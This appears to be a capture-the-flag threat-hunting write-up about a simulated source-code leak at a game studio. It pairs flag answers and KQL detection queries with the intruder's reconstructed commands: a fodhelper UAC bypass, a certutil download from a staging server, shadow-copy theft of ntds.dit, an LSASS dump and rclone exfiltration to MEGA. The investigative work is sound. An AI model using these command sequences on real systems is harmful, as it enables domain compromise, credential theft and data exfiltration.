# 🔥 IR-2026-0131-EF // EMBERFORGE: SOURCE LEAK
> **Status: 🚧 Work in Progress** — Investigation active. Flags updating as hunt progresses.

---

## Incident Overview

| Field | Detail |
|---|---|
| **Case ID** | IR-2026-0131-EF |
| **Severity** | Critical |
| **Reported** | 2026-01-30 |
| **Environment** | emberforge.local |
| **Platform** | Microsoft Sentinel — `EmberForgeX_CL` |
| **Log Sources** | Sysmon + Windows Security + Windows System |
| **Investigation Window** | 2026-01-30 21:00 UTC → 2026-01-31 00:00 UTC |

**Trigger:** Unreleased source code from EmberForge Studios' upcoming title *Neon Shadows* appeared on underground forums. External threat intelligence flagged the leak within 48 hours.

---

## Affected Assets

| Host | IP | Role |
|---|---|---|
| EC2AMAZ-B9GHHO6 | 10.1.173.145 | Workstation (Patient Zero) |
| EC2AMAZ-16V3AU4 | 10.1.57.66 | Server |
| EC2AMAZ-EEU3IA2 | 10.1.160.76 | Domain Controller |

---

## Flag Progress

### Phase 01 — Exfiltration

| Flag | Question | Answer | Timestamp |
|---|---|---|---|
| Flag 1 | Source directory of stolen data | `C:\GameDev` | 2026-01-30 23:11:28 |
| Flag 2 | Cloud provider that received data | `MEGA` | — |
| Flag 3 | Attacker email used to authenticate | `jwilson.vhr@proton.me` | — |
| Flag 5 | Exfiltration tool | `rclone.exe` | 2026-01-30 23:06:36 |
| Flag 6 | Destination IP | `66.203.125.15` | 2026-01-30 23:12:53 |
| Flag 7 | Plaintext password exposed in command line | `Summer2024!` | — |
| Flag 8 | Compression cmdlet used (LOTL) | `Compress-Archive` | — |
| Flag 9 | Attacker staging server | `sync.cloud-endpoint.net` | — |

### Phase 02 — Credential Access

| Flag | Question | Answer | Timestamp |
|---|---|---|---|
| Flag 4 | Domain credential file accessed via VSS | `ntds.dit` | 2026-01-30 23:35:10 |
| Flag 22 | Process that dumped LSASS | `update.exe` | — |
| Flag 23 | LSASS dump file location | `C:\Windows\System32\lsass.dmp` | — |

### Phase 03 — Initial Access

| Flag | Question | Answer | Timestamp |
|---|---|---|---|
| Flag 10 | Malicious file loaded on workstation | `review.dll` | 2026-01-30 21:27:03 |
| Flag 11 | Drive letter (ISO mount MOTW bypass) | `D:` | — |
| Flag 12 | Patient zero account | `lmartin` | — |
| Flag 13 | Execution chain | `explorer.exe > rundll32.exe > review.dll` | — |
| Flag 14 | Extraction step | `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\` | 2026-01-30 21:24:04 |
| Flag 15 | Primary C2 payload dropped | `C:\Users\Public\update.exe` | 2026-01-30 21:40:24 |

### Phase 04 — Command & Control

| Flag | Question | Answer | Timestamp |
|---|---|---|---|
| Flag 16 | C2 beacon domain | `cdn.cloud-endpoint.net` | — |
| Flag 17 | Resolved C2 IP | `104.21.30.237` | — |

### Phase 05 — Defense Evasion

| Flag | Question | Answer | Timestamp |
|---|---|---|---|
| Flag 18 | First process injection | `rundll32.exe > notepad.exe` | 2026-01-30 21:32:42 |
| Flag 19 | UAC bypass binary | `fodhelper.exe` | — |
| Flag 20 | Registry value that enables UAC bypass | `DelegateExecute` | 2026-01-30 21:38:50 |
| Flag 21 | Second injection for SYSTEM stability | `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)` | — |
| Flag 29 | Parent of all lateral movement commands | `spoolsv.exe` | — |

### Phase 06 — Discovery

| Flag | Question | Answer | Timestamp |
|---|---|---|---|
| Flag 24 | First discovery command | `net user /domain` | 2026-01-30 21:34:32 |
| Flag 25 | DA enumeration command | `net group "Domain Admins" /domain` | 2026-01-30 21:34:44 |
| Flag 26 | DC location command | `nltest /dclist:emberforge.local` | — |

### Phase 07 — Lateral Movement

| Flag | Question | Answer | Timestamp |
|---|---|---|---|
| Flag 27 | Network share created for distribution | `net share tools=C:\Users\Public /grant:everyone,full` | — |
| Flag 28 | Firewall rule added for SMB | `SMB` | — |
| Flag 30 | File copy to server via admin share | `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe` | — |
| Flag 31 | Utility used to download tools on server | `certutil.exe > http://sync.cloud-endpoint.net:8080/AnyDesk.exe` | 2026-01-30 22:10:52 |
| Flag 32 | Random service name used for remote execution | `MzLblBFm` | — |

---

## Attack Narrative

### Delivery
Lisa Martin (`lmartin`) was targeted via a spearphishing lure. She downloaded a 7-Zip installer (`7z2501-x64.exe`) via Edge browser, which extracted a malicious ISO archive containing `review.dll` into `C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\`.

### Initial Access
The ISO was mounted as `D:` — bypassing Windows **Mark of the Web (MOTW)** protections. Lisa double-clicked `review.dll` from Explorer, loaded via `rundll32.exe` calling the `StartW` export — a common C2 framework DLL payload pattern.

```
msedge.exe
  └── 7z2501-x64.exe              (7-Zip installer downloaded)
      └── 7zG.exe                  (archive extraction → EmberForge_Review\)
          └── explorer.exe         (Lisa browses D: drive)
              └── rundll32.exe "D:\review.dll,StartW"   ← initial execution
```

### Execution & Privilege Escalation
The DLL dropped `update.exe` to `C:\Users\Public\` and established persistence via scheduled task named `WindowsUpdate`. A `fodhelper.exe` UAC bypass was used to elevate privileges silently via COM hijack of the `ms-settings` registry key.

```
rundll32.exe (review.dll)
  └── schtasks → WindowsUpdate task (C:\Users\Public\update.exe)
  └── reg.exe → HKCU\Software\Classes\ms-settings\shell\open\command\(Default) = update.exe
  └── reg.exe → HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute = (Empty)
      └── fodhelper.exe → update.exe (elevated, UAC bypassed)
          └── schtasks → WindowsUpdate as SYSTEM
```

### Defense Evasion — Process Injection
Two injections performed to hide malicious activity inside legitimate processes:

```
rundll32.exe  ──injects──►  notepad.exe          (initial hiding)
update.exe    ──injects──►  spoolsv.exe (SYSTEM)  (long-term stability)
```

All subsequent attacker commands ran as children of `spoolsv.exe`.

### Command & Control
`update.exe` beaconed to `cdn.cloud-endpoint.net` resolving to `104.21.30.237` via HTTPS (port 443), routing through Cloudflare to obscure the true origin server.

### Discovery
Automated recon executed within seconds via `spoolsv.exe`:

```
net user /domain                    → enumerate all domain users
net group "Domain Admins" /domain   → identify privileged accounts
nltest /dclist:emberforge.local     → locate the Domain Controller
```

### Lateral Movement to Server
```
1. Open SMB inbound firewall rule → netsh advfirewall add rule name="SMB" port=445
2. Create staging share → net share tools=C:\Users\Public /grant:everyone,full
3. Copy payload → cmd.exe /c copy update.exe \\10.1.57.66\C$\Users\Public\update.exe
4. Remote execution → service MzLblBFm created on server
5. Server downloads tools → certutil -urlcache -f sync.cloud-endpoint.net:8080/AnyDesk.exe
```

### Credential Access
**LSASS Dump (Workstation):**
`update.exe` dumped LSASS memory using direct syscalls (bypassing API hooks) to `C:\Windows\System32\lsass.dmp`.

**VSS Credential Theft (Domain Controller):**
```
vssadmin create shadow /For=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
vssadmin delete shadows /Quiet   ← evidence destroyed
```

### Exfiltration
From the server (`EC2AMAZ-16V3AU4`):
```
Compress-Archive C:\GameDev → C:\Users\Public\gamedev.zip
rclone.exe → MEGA (jwilson.vhr@proton.me) → 66.203.125.15 (bt5.api.mega.co.nz)
```

---

## Full Attack Timeline

| Time (UTC) | Host | Event |
|---|---|---|
| 21:18 | Workstation | Edge browser active — Lisa browsing |
| 21:23 | Workstation | 7-Zip installer downloaded and executed |
| 21:24 | Workstation | Archive extracted → `EmberForge_Review\` |
| 21:27 | Workstation | `rundll32.exe` loads `D:\review.dll,StartW` ← **initial access** |
| 21:32 | Workstation | Injection: `rundll32.exe → notepad.exe` |
| 21:34 | Workstation | Discovery: `net user`, `net group`, `nltest` |
| 21:37 | Workstation | Persistence: scheduled task `WindowsUpdate` created |
| 21:38 | Workstation | UAC bypass staged via `ms-settings` COM hijack (`DelegateExecute`) |
| 21:40 | Workstation | `fodhelper.exe` elevates `update.exe` |
| 21:44 | Workstation | SYSTEM persistence cemented |
| 21:xx | Workstation | Injection: `update.exe → spoolsv.exe (SYSTEM)` |
| 21:xx | Workstation | LSASS dumped → `C:\Windows\System32\lsass.dmp` |
| 21:xx | Workstation | SMB firewall rule added, `tools` share created |
| 21:xx | Workstation | `update.exe` copied to server via `C$` admin share |
| 22:10 | Server | Service `MzLblBFm` created — remote execution |
| 22:10 | Server | `certutil` downloads `AnyDesk.exe` from staging server |
| 22:17 | Server | PowerShell IWR downloads `update.exe` |
| 22:18 | Server | `certutil` downloads `update.exe` (second attempt) |
| 23:06 | Server | `rclone.exe` executed |
| 23:11 | Server | `Compress-Archive C:\GameDev → gamedev.zip` |
| 23:12 | Server | `rclone` uploads to MEGA → `66.203.125.15` |
| 23:35 | DC | VSS shadow copy created |
| 23:35 | DC | `ntds.dit` copied to `C:\Windows\Temp\nyMdRNSp.tmp` |
| 23:35 | DC | Shadow copy deleted — evidence destroyed |

---

## Attacker Infrastructure

| Asset | Value |
|---|---|
| Staging server | `sync.cloud-endpoint.net:8080` |
| C2 domain | `cdn.cloud-endpoint.net` |
| C2 IPs | `104.21.30.237`, `172.67.174.46` (Cloudflare proxied) |
| Exfil destination | `bt5.api.mega.co.nz` / `66.203.125.15` |
| MEGA account | `jwilson.vhr@proton.me` |
| MEGA password | `Summer2024!` |

---

## MITRE ATT&CK Coverage

| Technique | ID | Evidence |
|---|---|---|
| Spearphishing attachment (ISO) | T1566.001 | `review.dll` delivered via ISO mounted as `D:` |
| Mark of the Web bypass | T1553.005 | ISO container bypasses MOTW tagging |
| Rundll32 execution | T1218.011 | `rundll32.exe D:\review.dll,StartW` |
| Process injection (CreateRemoteThread) | T1055.003 | `rundll32→notepad`, `update→spoolsv` |
| Scheduled task persistence | T1053.005 | `WindowsUpdate` task → `update.exe` |
| fodhelper UAC bypass | T1548.002 | `ms-settings` COM hijack → `DelegateExecute` |
| LSASS memory dump | T1003.001 | Direct syscalls → `lsass.dmp` |
| VSS credential theft | T1003.003 | `ntds.dit` via shadow copy |
| Network share lateral movement | T1021.002 | `tools` share + SMB firewall rule |
| Remote service creation | T1543.003 | Service `MzLblBFm` on server |
| Certutil download (LOTL) | T1105 | `certutil -urlcache -f` |
| Rclone exfiltration | T1048 | `gamedev.zip` → MEGA |
| Domain discovery | T1069.002 | `net user`, `net group`, `nltest` |

---

## Key KQL Queries

```kql
// Process executions — workstation
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "B9GHHO6"
| project UtcTime_s, User_s, ParentImage_s, Image_s, CommandLine_s
| sort by todatetime(UtcTime_s) asc

// Process injection events
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "8"
| project UtcTime_s, Computer, SourceImage_s, TargetImage_s
| sort by todatetime(UtcTime_s) asc

// UAC bypass registry modifications
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "13"
| where TargetObject_s contains "ms-settings"
| project UtcTime_s, Computer, Image_s, TargetObject_s, Details_s

// LSASS dump file creation
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "11"
| where TargetFilename_s has_any (".dmp", "lsass")
| project UtcTime_s, Computer, Image_s, TargetFilename_s

// VSS credential theft — DC
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where Computer contains "EEU3IA2"
| where CommandLine_s has_any ("vssadmin", "shadow", "ntds")
| project UtcTime_s, CommandLine_s

// Exfil tool network connections
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "3"
| where Image_s contains "rclone"
| project UtcTime_s, Computer, DestinationIp_s, DestinationPort_s, DestinationHostname_s

// C2 DNS beacon
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "22"
| extend ResolvedIP = extract("QueryResults'>([^<]+)", 1, Raw_s)
| where QueryName_s == "cdn.cloud-endpoint.net"
| project UtcTime_s, Computer, Image_s, QueryName_s, ResolvedIP

// Random service creation — lateral movement
EmberForgeX_CL
| where EventCode_s == "7045"
| where Computer contains "16V3AU4"
| extend ServiceName = extract("ServiceName'>([^<]+)", 1, Raw_s)
| extend ServicePath = extract("ImagePath'>([^<]+)", 1, Raw_s)
| project TimeGenerated, Computer, ServiceName, ServicePath
```

---

## Exfil Channels Ruled Out

| Channel | Checked | Method | Result |
|---|---|---|---|
| DNS tunnelling | ✅ | EID 22 — reviewed `QueryName_s` for anomalies | No evidence |
| HTTP POST to external | ✅ | EID 1 — `CommandLine_s` searched for curl/IWR/wget/ftp | Not found beyond known staging |
| FTP | ✅ | Included in `has_any` filter | Not found |
| MEGA via rclone | ✅ | EID 3 + EID 1 correlated | Confirmed exfil channel |

---

> 🚧 **Investigation ongoing.** Persistence mechanisms and remaining flags still being documented.
